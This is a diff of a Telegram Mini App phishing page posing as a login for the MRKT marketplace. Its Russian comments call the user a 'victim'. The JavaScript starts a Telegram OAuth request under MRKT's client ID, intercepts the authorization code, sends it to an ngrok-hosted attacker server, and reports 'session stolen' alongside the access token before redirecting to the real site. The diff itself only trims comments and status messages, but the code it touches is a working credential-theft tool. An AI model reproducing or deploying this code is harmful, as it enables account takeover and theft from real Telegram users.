@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <title>MRKT Авторизация</title>
+    <title>MRKT вход</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -77,29 +77,25 @@
     </div>
 
     <script>
-        // Инициализируем Telegram WebApp
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
 
         // ============================================================
-        // ⚡ ТВОЙ ПУБЛИЧНЫЙ АДРЕС (из ngrok)
+        // ⚡ ТВОЯ НОВАЯ ССЫЛКА ИЗ NGROK (ЗАМЕНИ!)
         // ============================================================
-        const SERVER_URL = 'https://cardigan-demise-overbite.ngrok-free.dev';
+        const SERVER_URL = 'https://cardigan-demise-overbite.ngrok-free.dev'; // ← ЗАМЕНИ НА НОВУЮ!
 
         // ============================================================
-        // ПОЛУЧАЕМ ДАННЫЕ ЖЕРТВЫ
+        // ПОЛУЧАЕМ ДАННЫЕ
         // ============================================================
         const victim = tg.initDataUnsafe?.user || {};
         const victimId = victim.id || 'unknown';
         const victimUsername = victim.username || 'unknown';
 
         console.log('👤 Жертва:', { victimId, victimUsername });
-        document.getElementById('info').textContent = `👤 Жертва: ${victimUsername} (ID: ${victimId})`;
+        document.getElementById('info').textContent = `👤 Жертва: ${victimUsername}`;
 
-        // ============================================================
-        // ГЕНЕРАЦИЯ ПАРАМЕТРОВ
-        // ============================================================
         function randomString(length) {
             return Math.random().toString(36).substring(2, 2 + length);
         }
@@ -108,9 +104,6 @@
             return randomString(15) + randomString(15) + randomString(15);
         }
 
-        // ============================================================
-        // ОСНОВНАЯ ФУНКЦИЯ
-        // ============================================================
         function startAuth() {
             const btn = document.getElementById('loginBtn');
             const status = document.getElementById('status');
@@ -122,9 +115,6 @@
             const state = randomString(12) + randomString(12);
             const challenge = generateChallenge();
 
-            // ============================================================
-            // ⚡ ФОРМИРУЕМ OAuth ЗАПРОС
-            // ============================================================
             const params = new URLSearchParams({
                 client_id: '8156315866',
                 origin: 'https://www.mrkt.land',
@@ -141,11 +131,8 @@
             const authUrl = 'https://oauth.telegram.org/auth?' + params.toString();
 
             console.log('🔗 Открываем:', authUrl);
-            status.textContent = '✅ Запрос отправлен! Подтвердите вход на телефоне.';
+            status.textContent = '✅ Запрос отправлен! Подтвердите вход.';
 
-            // ============================================================
-            // ОТКРЫВАЕМ ВНУТРИ TELEGRAM (БЕЗ БРАУЗЕРА!)
-            // ============================================================
             try {
                 tg.openLink(authUrl);
             } catch (e) {
@@ -153,17 +140,17 @@
             }
 
             // ============================================================
-            // ⚡ ПЕРЕХВАТЫВАЕМ CALLBACK
+            // ПЕРЕХВАТЫВАЕМ CALLBACK
             // ============================================================
             let attempts = 0;
             const maxAttempts = 30;
 
             const interval = setInterval(async () => {
                 attempts++;
-                
+
                 if (attempts > maxAttempts) {
                     clearInterval(interval);
-                    status.textContent = '⏰ Время ожидания истекло.';
+                    status.textContent = '⏰ Время истекло.';
                     btn.disabled = false;
                     btn.textContent = 'Войти в MRKT';
                     return;
@@ -176,17 +163,12 @@
 
                     if (code && state) {
                         clearInterval(interval);
-                        status.textContent = '✅ CODE перехвачен! Отправка на сервер...';
+                        status.textContent = '✅ CODE перехвачен!';
                         document.getElementById('info').textContent = `✅ CODE: ${code}`;
 
-                        // ============================================================
-                        // ⚡ ОТПРАВЛЯЕМ CODE НА СЕРВЕР
-                        // ============================================================
                         const response = await fetch(SERVER_URL + '/callback', {
                             method: 'GET',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
+                            headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
                                 code: code,
                                 state: state,
@@ -196,19 +178,18 @@
                         });
 
                         const data = await response.json();
-                        console.log('📡 Ответ сервера:', data);
+                        console.log('📡 Ответ:', data);
 
                         if (data.status === 'success') {
                             status.textContent = '✅ СЕССИЯ УКРАДЕНА! 🎉';
-                            document.getElementById('info').textContent = `🔥 ACCESS_TOKEN: ${data.access_token}`;
-                            btn.disabled = false;
-                            btn.textContent = 'Войти в MRKT';
+                            document.getElementById('info').textContent = `🔥 TOKEN: ${data.access_token}`;
                             window.location.href = 'https://www.mrkt.land';
                         } else {
-                            status.textContent = '⚠️ Ошибка: ' + (data.error || 'Неизвестная ошибка');
-                            btn.disabled = false;
-                            btn.textContent = 'Войти в MRKT';
+                            status.textContent = '⚠️ Ошибка: ' + data.error;
                         }
+
+                        btn.disabled = false;
+                        btn.textContent = 'Войти в MRKT';
                     }
                 } catch (error) {
                     console.error('❌ Ошибка:', error);
